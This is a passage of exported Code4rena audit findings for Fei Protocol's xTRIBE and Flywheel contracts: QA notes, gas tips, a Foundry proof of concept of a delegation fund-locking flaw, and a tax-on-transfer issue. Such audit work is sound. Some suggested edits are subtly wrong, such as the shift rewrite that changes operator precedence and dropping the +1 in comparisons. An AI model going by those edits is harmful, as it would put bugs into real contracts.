    "body": "# QA Report\n\n## Table of Contents\n\n- [summary](#summary)\n- [Typos](#typos)\n- [Comment Missing function parameter](#comment-missing-function-parameter)\n- [Function missing comments](#function-missing-comments)\n- [Setters should emit an event](#setters-should-emit-an-event)\n- [Setters should check the input value](#setters-should-check-the-input-value)\n- [assert statement should not be used](#assert-statement-should-not-be-used)\n\n\n\n# summary\n\n> Few vulnerabilities were found examining the contracts. The main concerns are with the presence of two `assert` statements, which is bad practice.\n>\n> Setters should check the input value before updating a storage variable.\n\n\n# Typos\n\n## PROBLEM\n\nThere are a few typos in the contracts.\n\n\n\n## SEVERITY\n\nNon-Critical\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### FlywheelCore.sol\n\n```\nFlywheelCore.sol:97: //user should be secondUser\n```\n\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nCorrect the typos.\n\n\n# Comment Missing function parameter\n\n## PROBLEM\n\nSome of the function comments are missing function parameters or returns\n\n\n\n## SEVERITY\n\nNon-Critical\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### xTRIBE.sol\n\n```\nxTRIBE.sol:89 address[] calldata accounts\n```\n\n### FlywheelGaugeRewards.sol\n\n```\nFlywheelGaugeRewards.sol:133: uint256 numRewards\n```\n\n### ERC20Gauges.sol\n\n```\nERC20Gauges.sol:97: address gauge\nERC20Gauges.sol:102: address gauge\nERC20Gauges.sol:143: address gauge\nERC20Gauges.sol:163: address user\nERC20Gauges.sol:168: address user, address gauge\nERC20Gauges.sol:193: address user\nERC20Gauges.sol:198: address user\nERC20Gauges.sol:495: address oldGauge, address newGauge\nERC20Gauges.sol:510: address account, bool canExceedMax\n```\n\n### ERC20MultiVotes.sol\n\n```\nERC20MultiVotes.sol:36: address account, uint32 pos\nERC20MultiVotes.sol:41: address account\nERC20MultiVotes.sol:114: uint256 newMax\nERC20MultiVotes.sol:122: address account, bool canExceedMax\n```\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nAdd a comment for these parameters\n\n\n# Function missing comments\n\n## PROBLEM\n\nSome functions are missing comments.\n\n\n\n## SEVERITY\n\nNon-Critical\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### FlywheelCore.sol\n\n```\nFlywheelCore.sol:146: _addStrategyForRewards(ERC20 strategy)\nFlywheelCore.sol:154: getAllStrategies()\n```\n\n### FlywheelGaugeRewards.sol\n\n```\nFlywheelGaugeRewards.sol:179:_queueRewards(\n        address[] memory gauges,\n        uint32 currentCycle,\n        uint32 lastCycle,\n        uint256 totalQueuedForCycle\n    )\n```\n\n### ERC20Gauges.sol\n\n```\nERC20Gauges.sol:251: _incrementGaugeWeight(\n        address user,\n        address gauge,\n        uint112 weight,\n        uint32 cycle\n    )\nERC20Gauges.sol:273: _incrementUserAndGlobalWeights(\n        address user,\n        uint112 weight,\n        uint32 cycle\n    )\nERC20Gauges.sol:334: _decrementGaugeWeight(\n        address user,\n        address gauge,\n        uint112 weight,\n        uint32 cycle\n    ) \nERC20Gauges.sol:353: _decrementUserAndGlobalWeights(\n        address user,\n        uint112 weight,\n        uint32 cycle\n    )\nERC20Gauges.sol:457: _addGauge(address gauge)\nERC20Gauges.sol:479: _removeGauge(address gauge)\n```\n\n### ERC20MultiVotes.sol\n\n```\nERC20MultiVotes.sol:236: _incrementDelegation(\n        address delegator,\n        address delegatee,\n        uint256 amount\n    )\nERC20MultiVotes.sol:258: _undelegate(\n        address delegator,\n        address delegatee,\n        uint256 amount\n    )\nERC20MultiVotes.sol:276: _writeCheckpoint(\n        address delegatee,\n        function(uint256, uint256)\n```\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nAdd comments to these functions\n\n# Setters should emit an event\n\n## PROBLEM\n\nAll setters should emit an event, so the Dapps can detect important changes\n\n\n\n## SEVERITY\n\nNon-Critical\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### FlywheelGaugeRewards.sol\n\n```\nFlywheelGaugeRewards.sol:273:setRewardsStream(IRewardsStream newRewardsStream) \n```\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nAdd the following event to the contract, and emit it at the end of the function\n```\nevent RewardsStreamUpdated(IRewardsStream newRewardsStream);\n```\n\n# Setters should check the input value\n\n## PROBLEM\n\nSetters should check the input value - ie make revert if it is the zero address or zero\n\n\n\n## SEVERITY\n\nLow\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### FlywheelCore.sol\n\n```\nFlywheelCore.sol:165:setFlywheelRewards(IFlywheelRewards newFlywheelRewards)\nFlywheelCore.sol:183:setBooster(IFlywheelBooster newBooster)\n```\n\n### FlywheelGaugeRewards.sol\n\n```\nFlywheelGaugeRewards.sol:273:setRewardsStream(IRewardsStream newRewardsStream)\n```\n\n### ERC20Gauges.sol\n\n```\nERC20Gauges.sol:502:setMaxGauges(uint256 newMax)\n```\n\n### ERC20MultiVotes.sol\n\n```\nERC20MultiVotes.sol:502:setMaxDelegates(uint256 newMax)\n```\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nAdd non-zero checks\n\n\n# assert statement should not be used\n\n## IMPACT\n\nProperly functioning code should never reach a failing assert statement. If it happened, it would indicate the presence of a bug in the contract. A failing assert uses all the remaining gas, which can be financially painful for a user.\n\n\n## SEVERITY\n\nLow\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### FlywheelGaugeRewards.sol\n\n```\nFlywheelGaugeRewards.sol:196: assert(queuedRewards.storedCycle == 0 || queuedRewards.storedCycle >= lastCycle);\nFlywheelGaugeRewards.sol:235: assert(queuedRewards.storedCycle >= cycle);\n```\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nReplace the assert statement with a require statement or a custom error\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-xtribe-findings",
      "repo": "https://github.com/code-423n4/2022-04-xtribe-findings",
      "url": "https://github.com/code-423n4/2022-04-xtribe-findings/issues/76"
    }
  },
  {
    "title": "Unbounded delegating increases gas cost of transfer and can lock all funds",
    "body": "# Lines of code\n\nhttps://github.com/fei-protocol/flywheel-v2/blob/main/src/token/ERC20MultiVotes.sol#L246\n\n\n# Vulnerability details\n\n## Impact\n[`ERC20MultiVotes`](https://github.com/fei-protocol/flywheel-v2/blob/main/src/token/ERC20MultiVotes.sol) has variable [`maxDelegates`](https://github.com/fei-protocol/flywheel-v2/blob/main/src/token/ERC20MultiVotes.sol#L107-L108) that determines the maximum number of accounts any account can delegate to. This check is ignored for contracts where [`canContractExceedMaxDelegates[address]`](https://github.com/fei-protocol/flywheel-v2/blob/main/src/token/ERC20MultiVotes.sol#L110-119) is set to `true`. These contracts can delegate to an uncapped number of accounts. This will in turn increase the gas cost of calling `transfer` `transferFrom` and `_burn` because they call [`_decrementVotesUntilFree`](https://github.com/fei-protocol/flywheel-v2/blob/main/src/token/ERC20MultiVotes.sol#L341-L342) which caches every delegated address when the contract does not have enough `freeVotes` to transfer the requested amount. Since the number of delegates is uncapped, it can increase to the point where transferring any amount of tokens will exceed the block gas limit, locking all funds in the delegating contract.\n\n## Proof of Concept\nThe purpose of allowing some contracts to ignore the maxDelegates check is to allow users to earn yield by depositing while maintaining their ability to vote on governance proposals. If the contract that is deposited into automatically delegates all votes back to the users, and exceeds a certain number of users, all funds will be locked in the contract. Some example scenarios:\n\nIf a contract delegates to ~4000 users, it will no longer be able to transfer all funds. This can be an issue if trying to rescue funds from a contract with a bug or move funds to a new implementation.\n\nIf a contract delegates to ~30000 users, calling `delegates(contract)` in a state changing function will exceed the block gas limit.\n\nIf a contract delegates to ~100000 users, transferring any amount of tokens will exceed the block gas limit.\n\nThis is a problem even if any of these limits aren't reached because the gas is paid for by users. Even at a fraction of the limit, UX will take a big hit since each user withdrawing will have to pay high fees.\n\n## Tools Used\nManual analysis. Foundry tests.\n\nI added this test to `ERC20MultiVotes.t.sol` to come up with the numbers above.\n```soldiity\nfunction testGasBrickDelegateOverMaxDelegatesApproved() public {\n    token.mint(address(this), 100e18);\n    token.setMaxDelegates(8);\n\n    token.setContractExceedMaxDelegates(address(this), true);\n\n    uint160 i = 1; // address 0 causes reverts\n    while (i < 100000) {\n        token.incrementDelegation(address(i), token.freeVotes(address(this))/100 /* random-ish distribution of tokens */);\n        i++;\n    }\n    token.incrementDelegation(address(250000), token.freeVotes(address(this))); // forces decrement\n    startMeasuringGas(\"values view call\");\n    token.delegates(address(this));\n    stopMeasuringGas();\n    \n    startMeasuringGas(\"transfer call\");\n    token.transfer(address(1000000), 1);\n    stopMeasuringGas();\n}\n```\n\n## Recommended Mitigation Steps\nTo ensure the contract doesn't lock all funds, a global maxDelegates can be used. However, this issue is pretty complex and would more effectively be solved at the level of the contract that takes deposits. One solution would be to ensure the delegating contract has enough `freeVotes` to cover any single user withdrawing funds. This can be done by checking the state of the contract off-chain and depositing funds when necessary. It can also be somewhat mitigated by not delegating to every user that deposits and instead giving them the option of \"requesting votes\", however this can still lead to the same issue if everyone requests votes. A combination of these two methods would work well.\n\nAnother solution, which I think is the most optimal, would be to reimplement `_decrementVotesUntilFree` to not cache all addresses and instead just remove delegates starting at index 0 until free using [`.length()`](https://github.com/fei-protocol/flywheel-v2/blob/main/lib/EnumerableSet.sol#L182-L184) and [`.at()`](https://github.com/fei-protocol/flywheel-v2/blob/main/lib/EnumerableSet.sol#L196-L198) methods provided by `EnumerableSet`. This solution does not solve the problem with calling `delegates(contract)` nor does it allow transferring all tokens at once with > 4000 delegates. This second point can be dealt with by breaking up the transfer into smaller functions and bundling using flashbots. I have added an example implementation below.\n\n```solidity \nfunction _decrementVotesUntilFree(address user, uint256 votes) internal {\n    uint256 userFreeVotes = freeVotes(user);\n\n    // early return if already free\n    if (userFreeVotes >= votes) return;\n\n    // cache total for batch updates\n    uint256 totalFreed;\n\n    // Loop through all delegates\n    //address[] memory delegateList = _delegates[user].values();\n\n    // Free delegates until through entire list or under votes amount\n    uint256 size = _delegates[user].length();\n    for (uint256 i = 0; i < size && (userFreeVotes + totalFreed) < votes; i++) {\n        address delegatee = _delegates[user].at(i); // get each user as necessary, removes unnecessary SLOADs\n        uint256 delegateVotes = _delegatesVotesCount[user][delegatee];\n        if (delegateVotes != 0) {\n            totalFreed += delegateVotes;\n\n            require(_delegates[user].remove(delegatee)); // Remove from set. Should never fail.\n\n            _delegatesVotesCount[user][delegatee] = 0;\n\n            _writeCheckpoint(delegatee, _subtract, delegateVotes);\n            emit Undelegation(user, delegatee, delegateVotes);\n        }\n    }\n\n    userDelegatedVotes[user] -= totalFreed;\n}\n```\n\nThe sponsor mentioned they intend to solve this at the delegating contract level, nonetheless, this issue should at least be mentioned in the contract as it is open source and others might use it with an improper implementation.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-xtribe-findings",
      "repo": "https://github.com/code-423n4/2022-04-xtribe-findings",
      "url": "https://github.com/code-423n4/2022-04-xtribe-findings/issues/75"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Gas Report\n\n## Table of Contents\n\n- [Caching storage variables in memory to save gas](#caching-storage-variables-in-memory-to-save-gas)\n- [Calldata instead of memory for RO function parameters](#calldata-instead-of-memory-for-ro-function-parameters)\n\n- [Comparison operators](#comparison-operators)\n- [Custom errors](#custom-errors)\n- [Default value initialization](#default-value-initialization)\n- [Prefix increments](#prefix-increments)\n- [Shifting cheaper than division](#shifting-cheaper-than-division)\n- [unnecessary computation](#unnecessary-computation)\n\n# Caching storage variables in memory to save gas \n\n## IMPACT\n\nAnytime you are reading from storage more than once, it is cheaper in gas cost to cache the variable in memory: a SLOAD cost 100gas, while MLOAD and MSTORE cost 3 gas.  \n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### FlywheelCore.sol\n\nscope: `setFlywheelRewards()`\n\n\n- `flywheelRewards` is read twice:\n\n```\nFlywheelCore.sol:166\nFlywheelCore.sol:168\n```\n\nscope: `accrueStrategy()`\n\n- `flywheelBooster` is read twice:\n\n```\nFlywheelCore.sol:220\nFlywheelCore.sol:221\n```\n\nscope: `accrueUser()`\n\n- `flywheelBooster` is read twice:\n\n```\nFlywheelCore.sol:258\nFlywheelCore.sol:259\n```\n\n\n\n\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\ncache these storage variables in memory\n\n# Calldata instead of memory for RO function parameters \n\n## PROBLEM\n\nIf a reference type function parameter is read-only, it is cheaper in gas to use calldata instead of memory.\nCalldata is a non-modifiable, non-persistent area where function arguments are stored, and behaves mostly like memory.\n\nTry to use calldata as a data location because it will avoid copies and also makes sure that the data cannot be modified.\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### FlywheelCore.sol\n\nscope: `accrueStrategy()`\n```\nFlywheelCore.sol:210: RewardsState memory state\n```\n\nscope: `accrueUser()`\n```\nFlywheelCore.sol:241: RewardsState memory state\n```\n\n### FlywheelGaugeRewards.sol\n\nscope: `_queueRewards()`\n```\nFlywheelGaugeRewards.sol:180: address[] memory gauges\n```\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n## MITIGATION\n\nReplace `memory` with `calldata`  \n\n\n\n# Comparison Operators \n\n## IMPACT\n\nIn the EVM, there is no opcode for ` >=` or `<=`.\nWhen using greater than or equal, two operations are performed: `>` and `=`.\n\nUsing strict comparison operators hence saves gas\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### FlywheelGaugeRewards.sol\n```\nFlywheelGaugeRewards.sol:107\nFlywheelGaugeRewards.sol:139\nFlywheelGaugeRewards.sol:154\nFlywheelGaugeRewards.sol:163\nFlywheelGaugeRewards.sol:200\n```\n\n### ERC20Gauges.sol\n```\nERC20Gauges.sol:259\n```\n\n### ERC20MultiVotes.sol\n```\nERC20MultiVotes.sol:379\n```\n\n\n\n\n\n## TOOLS USED\n\nManual Analysis  \n\n\n## MITIGATION\n\nReplace `<=` with `<`, and `>=` with `>`. Do not forget to increment/decrement the compared variable\n\nexample:\n\n```\n-cycle - block.timestamp <= incrementFreezeWindow;\n+cycle - block.timestamp < incrementFreezeWindow + 1;\n```\n\nHowever, if `1` is negligible compared to the value of the variable, we can omit the increment.\n\nexample:\n\n```\n-cycle - block.timestamp <= incrementFreezeWindow;\n+cycle - block.timestamp < incrementFreezeWindow;\n```\n\n\n# Custom Errors \n\n## IMPACT\n\nCustom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met) while providing the same amount of information, as explained [here](https://blog.soliditylang.org/2021/04/21/custom-errors/)\n\nCustom errors are defined using the error statement\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### FlywheelCore.sol\n\n```\nFlywheelCore.sol:147\n```\n\n### FlywheelGaugeRewards.sol\n\n```\nFlywheelGaugeRewards.sol:114\nFlywheelGaugeRewards.sol:153\nFlywheelGaugeRewards.sol:154\nFlywheelGaugeRewards.sol:195\nFlywheelGaugeRewards.sol:200\n```\n\n### ERC20Gauges.sol\n\n```\nERC20Gauges.sol:345\n```\n\n### ERC20MultiVotes.sol\n\n```\nERC20MultiVotes.sol:266\nERC20MultiVotes.sol:352\nERC20MultiVotes.sol:379\nERC20MultiVotes.sol:392\nERC20MultiVotes.sol:393\n```\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nReplace require and revert statements with custom errors.\n\nFor instance, in `FlywheelGaugeRewards.sol`:\n\nReplace\n```\nrequire(newRewards <= type(uint112).max);\n```\n\nwith\n\n```\nif (newRewards > type(uint112).max) {\n\t\trevert IsNotSafeCast(newRewards);\n}\n```\n\nand define the custom error in the contract\n```\nerror IsNotSafeCast(uint256 newRewards);\n```\n\n\n# Default value initialization \n\n## IMPACT\n\nIf a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type).\nExplicitly initializing it with its default value is an anti-pattern and wastes gas.\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n\n### xTribe.sol\n\n```\nxTribe.sol:95: uint256 i = 0;\n```\n\n### FlywheelGaugeRewards.sol\n\n```\nFlywheelGaugeRewards.sol:189: uint256 i = 0;\n```\n\n### ERC20Gauges.sol\n\n```\nERC20Gauges.sol:134: uint256 i = 0;\nERC20Gauges.sol:184: uint256 i = 0;\nERC20Gauges.sol:307: uint256 i = 0;\nERC20Gauges.sol:384: uint256 i = 0;\nERC20Gauges.sol:564: uint256 i = 0;\n```\n\n### ERC20MultiVotes.sol\n\n```\nERC20MultiVotes.sol:79: uint256 low = 0;\nERC20MultiVotes.sol:346: uint256 i = 0;\n```\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nRemove explicit initialization for default values.\n\n\n\n\n\n# Prefix increments \n\n## IMPACT\n\nPrefix increments are cheaper than postfix increments.\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### xTRIBE.sol\n\n```\nxTRIBE.sol:99\n```\n\n### FlywheelGaugeRewards.sol\n\n```\nFlywheelGaugeRewards.sol:189\n```\n\n### ERC20Gauges.sol\n\n```\nERC20Gauges.sol:137\nERC20Gauges.sol:187\nERC20Gauges.sol:314\nERC20Gauges.sol:391\nERC20Gauges.sol:576\n```\n\n### ERC20MultiVotes.sol\n\n```\nERC20MultiVotes.sol:346\nERC20MultiVotes.sol:392\n```\n\n\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nchange `variable++` to `++variable`.\n\n\n\n\n\n# Shifting cheaper than division\n\n## IMPACT\n\n A division by 2 can be calculated by shifting one to the right. While the DIV opcode uses 5 gas, the SHR opcode only uses 3 gas. Furthermore, Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting.\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### ERC20MultiVotes.sol\n\n```\nERC20MultiVotes:94: return (a & b) + (a ^ b) / 2;\n```\n\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\n```\n-return (a & b) + (a ^ b) / 2;\n+return (a & b) + (a ^ b) >> 1;\n```\n\n\n\n# Unnecessary computation\n\n## IMPACT\n\nWhen emitting an event that includes a new and an old value, it is cheaper in gas to avoid caching the old value in memory. Instead, emit the event, then save the new value in storage.\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n\n### ERC20Gauges.sol\n\n```\nERC20Gauges.sol:506\n```\n\n### ERC20MultiVotes.sol\n\n```\nERC20MultiVotes.sol:118\n```\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nReplace\n```\nuint256 oldMax = maxDelegates;\nmaxDelegates = newMax;\nemit MaxDelegatesUpdate(oldMax, newMax);\n```\n\nwith\n\n```\nemit MaxDelegatesUpdate(maxDelegates, newMax);\nmaxDelegates = newMax;\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-xtribe-findings",
      "repo": "https://github.com/code-423n4/2022-04-xtribe-findings",
      "url": "https://github.com/code-423n4/2022-04-xtribe-findings/issues/74"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "Should not have pargma ^  bec bugs can occur\nhttps://github.com/fei-protocol/xTRIBE/blob/989e47d176facbb0c38bc1e1ca58672f179159e1/src/xTRIBE.sol\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20Gauges.sol\nhttps://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol\nhttps://github.com/fei-protocol/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/xERC4626.sol\n",
    "dataSource": {
      "name": "code-423n4/2022-04-xtribe-findings",
      "repo": "https://github.com/code-423n4/2022-04-xtribe-findings",
      "url": "https://github.com/code-423n4/2022-04-xtribe-findings/issues/72"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA\n\n1.Variables don't need to be assigned their default values :\n\nhttps://github.com/fei-protocol/flywheel-v2/blob/5ac5d314362188e3ece31a9db7deba529f4e8cc7/src/token/ERC20Gauges.sol#L134\n\nhttps://github.com/fei-protocol/flywheel-v2/blob/5ac5d314362188e3ece31a9db7deba529f4e8cc7/src/rewards/FlywheelGaugeRewards.sol#L189\n\nhttps://github.com/fei-protocol/flywheel-v2/blob/5ac5d314362188e3ece31a9db7deba529f4e8cc7/src/token/ERC20Gauges.sol#L564\n\nhttps://github.com/fei-protocol/flywheel-v2/blob/5ac5d314362188e3ece31a9db7deba529f4e8cc7/src/token/ERC20Gauges.sol#L184\n\nhttps://github.com/fei-protocol/flywheel-v2/blob/5ac5d314362188e3ece31a9db7deba529f4e8cc7/src/token/ERC20Gauges.sol#L307\n\nhttps://github.com/fei-protocol/flywheel-v2/blob/5ac5d314362188e3ece31a9db7deba529f4e8cc7/src/token/ERC20Gauges.sol#L384\n\nhttps://github.com/fei-protocol/flywheel-v2/blob/5ac5d314362188e3ece31a9db7deba529f4e8cc7/src/token/ERC20MultiVotes.sol#L346",
    "dataSource": {
      "name": "code-423n4/2022-04-xtribe-findings",
      "repo": "https://github.com/code-423n4/2022-04-xtribe-findings",
      "url": "https://github.com/code-423n4/2022-04-xtribe-findings/issues/71"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Gas optimizations \n* Use delete in the `claimRewards` function of the `FlywheelCore` contract and in the `_decrementVotesUntilFree` function of the `ERC20MultiVotes` contract in order to trigger a gas refund\n* Loops can be optimized in several ways. Let's take for example the loop in the `incrementGauges` function in `ERC20Gauges` (There is also a loop in the `decrementGauges` function which is similar).\n    ```sol\n    // Update gauge specific state\n    for (uint256 i = 0; i < size; ) {\n        address gauge = gaugeList[i];\n        uint112 weight = weights[i];\n        weightsSum += weight;\n\n        _incrementGaugeWeight(msg.sender, gauge, weight, currentCycle);\n        unchecked {\n            i++;\n        }\n    }\n    ```\n    We can do multiple things here:\n    1. Variables in solidity are already initialized to their default value, and initializing them to the same value actually costs more gas. So for example in the loop above, the code can be optimized using `uint i;` instead of `uint i = 0;`.\n    2. Use ++i instead of i++ to save some gas spent in every iteration.\n\n    Let's look at another example:\n\n    ```sol\n    uint256 size = gaugeList.length;\n    for (uint256 i = 0; i < size && (userFreeWeight + totalFreed) < weight; ) {\n        address gauge = gaugeList[i];\n        uint112 userGaugeWeight = getUserGaugeWeight[user][gauge];\n        if (userGaugeWeight != 0) {\n            // If the gauge is live (not deprecated), include its weight in the total to remove\n            if (!_deprecatedGauges.contains(gauge)) {\n                totalFreed += userGaugeWeight;\n            }\n            userFreed += userGaugeWeight;\n            _decrementGaugeWeight(user, gauge, userGaugeWeight, currentCycle);\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n    ```\n    First of all, the optimizations from the loop before can be done here too. In addition, there is another optimization that can be done here - the condition of the loop contains 2 conditions - `i < size && (userFreeWeight + totalFreed) < weight`.\n    In order to avoid calculating `userFreeWeight + totalFreed` in every iteration, you can calculate `weight - userFreeWeight` (let's assume that `weightLeftToFree == weight - userFreeWeight`) once and change the condition to `totalFreed < weightLeftToFree`. You can also use unchecked on the calculation of `weightLeftToFree` because you know for sure that `weight > userFreeWeight` (or there was no weight to free).\n\n\n\n* Use unchecked in `_incrementDelegation` and `_undelegate` in `ERC20MultiVotes`\nIn the `_incrementDelegation` function you increment both `_delegatesVotesCount[delegator][delegatee]` and `userDelegatedVotes[delegator]`. We know for sure that `_delegatesVotesCount[delegator][delegatee] <= userDelegatedVotes[delegator]`, because `userDelegatedVotes[delegator]` is incremented at least any time that `_delegatesVotesCount[delegator][delegatee]` (it's also incremented when delegating other delegatees), so unchecked can be used when incrementing `_delegatesVotesCount[delegator][delegatee]` because if it will overflow `userDelegatedVotes[delegator]` will overflow too.\n    We can see a similar thing in the `_undelegate` function. In that function we decrement both `_delegatesVotesCount[delegator][delegatee]` and `userDelegatedVotes[delegator]`, and for the same reason we know that if `userDelegatedVotes[delegator]` will underflow, `_delegatesVotesCount[delegator][delegatee]` will underflow too, so we can use unchecked when decrementing `userDelegatedVotes[delegator]`.\n\n    ```sol\n    function _incrementDelegation(\n        address delegator,\n        address delegatee,\n        uint256 amount\n    ) internal virtual {\n        // ...\n\n        userDelegatedVotes[delegator] += amount;\n        unchecked {\n            _delegatesVotesCount[delegator][delegatee] += amount;\n        }\n        \n        // ...\n    }\n\n    function _undelegate(\n            address delegator,\n            address delegatee,\n            uint256 amount\n        ) internal virtual {\n            uint256 newDelegates = _delegatesVotesCount[delegator][delegatee] - amount;\n            \n            // ...\n\n            _delegatesVotesCount[delegator][delegatee] = newDelegates;\n            unchecked {\n                userDelegatedVotes[delegator] -= amount;\n            }\n    ```\n",
    "dataSource": {
      "name": "code-423n4/2022-04-xtribe-findings",
      "repo": "https://github.com/code-423n4/2022-04-xtribe-findings",
      "url": "https://github.com/code-423n4/2022-04-xtribe-findings/issues/70"
    }
  },
  {
    "title": "xERC4626 does not work well with token tax on transfer",
    "body": "# Lines of code\n\nhttps://github.com/Rari-Capital/solmate/blob/12421e3edee21cfb99bf5a6edd6169e6497511de/src/mixins/ERC4626.sol#L48\nhttps://github.com/Rari-Capital/solmate/blob/12421e3edee21cfb99bf5a6edd6169e6497511de/src/mixins/ERC4626.sol#L61\nhttps://github.com/Rari-Capital/solmate/blob/12421e3edee21cfb99bf5a6edd6169e6497511de/src/mixins/ERC4626.sol#L78\nhttps://github.com/Rari-Capital/solmate/blob/12421e3edee21cfb99bf5a6edd6169e6497511de/src/mixins/ERC4626.sol#L107\nhttps://github.com/fei-protocol/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/ERC4626Router.sol#L38\nhttps://github.com/fei-protocol/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/ERC4626Router.sol#L51\nhttps://github.com/fei-protocol/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/ERC4626Router.sol#L65\n\n\n# Vulnerability details\n\n\nIn case of token tax on transfer, not 100% of asset will be transferTo recipient.\n\n## Impact\n\nThe [mint share function](https://github.com/Rari-Capital/solmate/blob/12421e3edee21cfb99bf5a6edd6169e6497511de/src/mixins/ERC4626.sol#L61) will always return more share than the amount send to vault.\n\nThe [router function](https://github.com/fei-protocol/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/ERC4626Router.sol#L24-L25) will always revert because the amount asset returned and receiving always wrong.\n\n## POC\n\nBecause the amount of share to mint is calculated before receiving token.\nAnd the amount of receiving token is always less due to tax.\n\nSo in a reward cycle, later depositor got some share price benefit than everyone else because `totalAsset()` using the amount of received token, while depositor calculate price using the amount of sending token.\n\n## Recommended Mitigation Steps\n\nNot authorized vault with underlying token with tax. Although, the price slippage is negligible and meme token seem to work well as long as tax price is small.\n\nOr fix [router](https://github.com/fei-protocol/ERC4626/blob/643cd044fac34bcbf64e1c3790a5126fec0dbec1/src/ERC4626Router.sol#L25) to reflect current balance received by router instead of amount set by user. Replace all `amount` with \n`ERC20(vault.asset()).balanceOf(address(this))`\n\nFrom: `return deposit(vault, to, amount, minSharesOut);`\n\nTo: `return deposit(vault, to, ERC20(vault.asset()).balanceOf(address(this)), minSharesOut);`\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-xtribe-findings",
      "repo": "https://github.com/code-423n4/2022-04-xtribe-findings",
      "url": "https://github.com/code-423n4/2022-04-xtribe-findings/issues/67"
    }
  },
  {
    "title": "QA Report",
    "body": "- [[L-01] Immutable addresses should be 0-checked](#l-01-immutable-addresses-should-be-0-checked)\n- [[L-02] Prevent accidentally burning tokens](#l-02-prevent-accidentally-burning-tokens)\n- [[N-01] `require()` should be used for checking error conditions on inputs and return values while `assert()` should be used for invariant checking](#n-01-require-should-be-used-for-checking-error-conditions-on-inputs-and-return-values-while-assert-should-be-used-for-invariant-checking)\n- [[N-02] Missing comments](#n-02-missing-comments)\n- [[N-03] Unused named returns](#n-03-unused-named-returns)\n- [[N-04] It's better to emit after all processing is done](#n-04-its-better-to-emit-after-all-processing-is-done)\n- [[N-05] Upgrade pragma to at least 0.8.4](#n-05-upgrade-pragma-to-at-least-084)\n- [[N-06] Avoid floating pragmas: the version should be locked](#n-06-avoid-floating-pragmas-the-version-should-be-locked)\n\n## [L-01] Immutable addresses should be 0-checked\n\nIn the constructors, the solution never checks for `address(0)` when setting the value of immutable variables. I suggest adding those checks.\n\nList of immutable variables:\n\n```solidity\nlib/flywheel-v2/src/FlywheelCore.sol:\n  32:     ERC20 public immutable rewardToken;\n\nlib/flywheel-v2/src/rewards/FlywheelGaugeRewards.sol:\n  75:     ERC20Gauges public immutable gaugeToken;\n```\n\n## [L-02] Prevent accidentally burning tokens\n\nTransferring tokens to the zero address is usually prohibited to accidentally avoid \"burning\" tokens by sending them to an unrecoverable zero address.\n\nConsider adding a check to prevent accidentally burning tokens here:\n\n```solidity\nflywheel-v2/src/token/ERC20Gauges.sol:533:        return super.transfer(to, amount);\nflywheel-v2/src/token/ERC20Gauges.sol:542:        return super.transferFrom(from, to, amount);\nflywheel-v2/src/token/ERC20MultiVotes.sol:318:        return super.transfer(to, amount);\nflywheel-v2/src/token/ERC20MultiVotes.sol:327:        return super.transferFrom(from, to, amount);\nxTRIBE/src/xTRIBE.sol:134:        return ERC20.transfer(to, amount);\nxTRIBE/src/xTRIBE.sol:149:        return ERC20.transferFrom(from, to, amount);\n```\n\n## [N-01] `require()` should be used for checking error conditions on inputs and return values while `assert()` should be used for invariant checking\n\nProperly functioning code should **never** reach a failing assert statement, unless there is a bug in your contract you should fix. Here, I believe the assert should be a require or a revert:\n\n```solidity\nflywheel-v2/src/rewards/FlywheelGaugeRewards.sol:196:            